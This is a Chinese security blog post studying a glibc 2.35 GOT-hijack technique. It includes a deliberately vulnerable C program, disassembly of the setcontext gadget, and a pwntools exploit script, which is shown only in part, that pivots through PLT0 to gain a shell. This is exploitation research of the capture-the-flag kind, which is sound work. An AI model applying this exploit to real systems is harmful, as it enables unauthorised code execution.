<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="代码仓： https:&#x2F;&#x2F;github.com&#x2F;veritas501&#x2F;glibc_got_hijack_study 分析现在我们有这样一段代码： 123456789101112#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &amp;#123;    char *addr &#x3D; 0;    size_t len &#x3D; 0;    prin">
<meta property="og:type" content="article">
<meta property="og:title" content="glibc GOT hijack 学习">
<meta property="og:url" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="veritas501&#39;s blog">
<meta property="og:description" content="代码仓： https:&#x2F;&#x2F;github.com&#x2F;veritas501&#x2F;glibc_got_hijack_study 分析现在我们有这样一段代码： 123456789101112#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &amp;#123;    char *addr &#x3D; 0;    size_t len &#x3D; 0;    prin">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207152315293.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207152940811.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207153252494.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207155109234.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207155810000.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207155942859.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207160329936.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207161421600.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207161848218.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207162602156.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164330720.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164338252.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164423438.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164648648.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207163123614.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207165105689.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207165134213.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207170119228.png">
<meta property="og:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207170305334.png">
<meta property="article:published_time" content="2023-12-06T16:00:00.000Z">
<meta property="article:modified_time" content="2023-12-08T03:09:28.462Z">
<meta property="article:author" content="veritas501">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207152315293.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>glibc GOT hijack 学习</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&text=glibc GOT hijack 学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&is_video=false&description=glibc GOT hijack 学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=glibc GOT hijack 学习&body=Check out this article: https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&name=glibc GOT hijack 学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&t=glibc GOT hijack 学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-origin"><span class="toc-number">1.1.</span> <span class="toc-text">0x00. origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-fx0"><span class="toc-number">1.2.</span> <span class="toc-text">0x01. fx0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-fx1"><span class="toc-number">1.3.</span> <span class="toc-text">0x02. fx1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-fx2"><span class="toc-number">1.4.</span> <span class="toc-text">0x03. fx2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-fx3"><span class="toc-number">1.5.</span> <span class="toc-text">0x04. fx3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-fx4"><span class="toc-number">1.6.</span> <span class="toc-text">0x05. fx4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-fx5"><span class="toc-number">1.7.</span> <span class="toc-text">0x06. fx5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-one-punch"><span class="toc-number">1.8.</span> <span class="toc-text">0x07. one_punch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.</span> <span class="toc-text">Reference</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        glibc GOT hijack 学习
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">veritas501</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-06T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-12-07</time>
        
        (Updated: <time datetime="2023-12-08T03:09:28.462Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>代码仓： <a target="_blank" rel="noopener" href="https://github.com/veritas501/glibc_got_hijack_study">https://github.com/veritas501/glibc_got_hijack_study</a></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>现在我们有这样一段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *addr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;addr, <span class="number">8</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;len, <span class="number">8</span>);</span><br><span class="line">    read(<span class="number">0</span>, addr, len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n132&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何利用才能获得一个shell？</p>
<h3 id="0x00-origin"><a href="#0x00-origin" class="headerlink" title="0x00. origin"></a>0x00. origin</h3><p>在高版本的glibc环境里，通过任意地址写做到RCE似乎越来越难（别人说的，我好久没打CTF比赛了），因为我们的RCE好帮手<code>__free_hook</code>没了。可能的RCE方式大概有几种：</p>
<ol>
<li>先leak <code>ptr mangling cookie</code>然后去修改<code>__exit_funcs</code>项</li>
<li>计算ld.so的地址，从而修改<code>l_addr</code>并伪造<code>DT_FINI</code>项</li>
<li>设置特殊的<code>_codecvt</code>和<code>_wide_data</code>结构体从而劫持FILE_IO结构体</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@pepsipu/SyqPbk94a">作者</a>提出了一种新的利用思路：打glibc的GOT表。</p>
<p>先看一下实验的glibc版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./libc-2.35.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35.</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 11.4.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br><span class="line"></span><br><span class="line">$ sha256sum libc-2.35.so</span><br><span class="line">2e15e345ccba1e1e8bf3bc58938d13eb7ccc17044942f0376cd5bc771f429b79  libc-2.35.so</span><br></pre></td></tr></table></figure>



<p>首先我们知道，glibc中存在一个非常好用的gadget<code>setcontext</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000053A00                 pop     rdx</span><br><span class="line">.text:0000000000053A01                 cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000053A07                 jnb     loc_53B2F</span><br><span class="line">.text:0000000000053A0D                 mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000053A14                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000053A16                 ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000053A1D                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000053A24                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000053A2B                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000053A2F                 mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000053A33                 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000053A37                 mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000053A3B                 mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000053A3F                 test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000053A4B                 jz      loc_53B06</span><br><span class="line"></span><br><span class="line">.text:0000000000053B06 loc_53B06:</span><br><span class="line">.text:0000000000053B06                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000053B0D                 push    rcx</span><br><span class="line">.text:0000000000053B0E                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000053B12                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000053B16                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000053B1D                 mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000053B21                 mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000053B25                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000053B2C                 xor     eax, eax</span><br><span class="line">.text:0000000000053B2E                 retn</span><br></pre></td></tr></table></figure>



<p>通常我们会通过前置利用设置好rdx的值，然后从<code>mov rsp, [rdx+0A0h]</code>开始执行。但这次我贴代码从<code>pop rdx</code>开始贴，可以注意一下这个<strong>细节</strong>，后面马上会说到。</p>
<p>glibc中其实是存在<code>.got.plt</code>表的，且在执行时会用到：</p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207152315293.png"></p>
<p>例如执行<code>printf</code>时其实就会调用<code>strchrnul.plt</code>，从而从<code>strchrnul.got</code>取出其中的<code>strchrnul</code>并执行：</p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207152940811.png"></p>
<p>在glibc-2.35中，<code>.got.plt</code>在执行时一直是<code>rw-</code>权限的，<strong>包括最前面的GOT0项</strong>（因为从2.36开始GOT0就不可写了，需要用到新的方法）：</p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207153252494.png"></p>
<p>这给了我们创造一个利用机会，我们注意到PLT0的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000028000                 push    cs:qword_219008</span><br><span class="line">.plt:0000000000028006                 bnd jmp cs:qword_219010</span><br></pre></td></tr></table></figure>

<p>此处push的值和jmp的地址都是从GOT0中取出来的，可以受我们控制。而这个<code>push</code>刚好就和我们前面提到的<code>setcontext</code>中的<code>pop rdx</code>对上了！</p>
<p>因此连起来就是：</p>
<ol>
<li>修改<code>strchrnul.got</code>到<code>plt0 (0x28000)</code></li>
<li>修改<code>GOT0 (0x219008)</code>为GOT表下面一点未使用的内存空间</li>
<li>修改<code>GOT0 (0x219010)</code>为<code>setcontext gadget (0x53A00)</code></li>
<li>在GOT表下面一点未使用的内存空间中布置<code>setcontext</code>需要用到的context buffer</li>
<li>调用<code>printf</code>函数触发<code>strchrnul.plt</code>劫持程序流，完成利用</li>
</ol>
<ul>
<li>完整代码：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ucontext</span>(<span class="params">src: <span class="built_in">int</span>, rsp=<span class="number">0</span>, rbx=<span class="number">0</span>, rbp=<span class="number">0</span>, r12=<span class="number">0</span>, r13=<span class="number">0</span>, r14=<span class="number">0</span>, r15=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">                    rsi=<span class="number">0</span>, rdi=<span class="number">0</span>, rcx=<span class="number">0</span>, r8=<span class="number">0</span>, r9=<span class="number">0</span>, rdx=<span class="number">0</span>, rip=<span class="number">0</span></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = flat(&#123;</span><br><span class="line">        <span class="number">0x28</span>: r8,</span><br><span class="line">        <span class="number">0x30</span>: r9,</span><br><span class="line">        <span class="number">0x48</span>: r12,</span><br><span class="line">        <span class="number">0x50</span>: r13,</span><br><span class="line">        <span class="number">0x58</span>: r14,</span><br><span class="line">        <span class="number">0x60</span>: r15,</span><br><span class="line">        <span class="number">0x68</span>: rdi,</span><br><span class="line">        <span class="number">0x70</span>: rsi,</span><br><span class="line">        <span class="number">0x78</span>: rbp,</span><br><span class="line">        <span class="number">0x80</span>: rbx,</span><br><span class="line">        <span class="number">0x88</span>: rdx,</span><br><span class="line">        <span class="number">0x98</span>: rcx,</span><br><span class="line">        <span class="number">0xA0</span>: rsp,</span><br><span class="line">        <span class="number">0xA8</span>: rip,  <span class="comment"># ret ptr</span></span><br><span class="line">        <span class="number">0xE0</span>: src,  <span class="comment"># fldenv ptr</span></span><br><span class="line">        <span class="number">0x1C0</span>: <span class="number">0x1F80</span>,  <span class="comment"># ldmxcsr</span></span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>, word_size=<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcontext32</span>(<span class="params">libc: ELF, **kwargs</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">bytes</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt0 = libc.address + libc.get_section_by_name(</span><br><span class="line">        <span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">    write_dest = got + <span class="number">8</span></span><br><span class="line">    got_count = <span class="number">0x36</span>  <span class="comment"># hardcoded</span></span><br><span class="line">    context_dest = write_dest + <span class="number">0x10</span> + got_count * <span class="number">8</span></span><br><span class="line">    write_data = flat(</span><br><span class="line">        context_dest,</span><br><span class="line">        libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">32</span>,</span><br><span class="line">        [plt0] * got_count,</span><br><span class="line">        create_ucontext(context_dest, rsp=libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>,</span><br><span class="line">                        **kwargs),</span><br><span class="line">    )</span><br><span 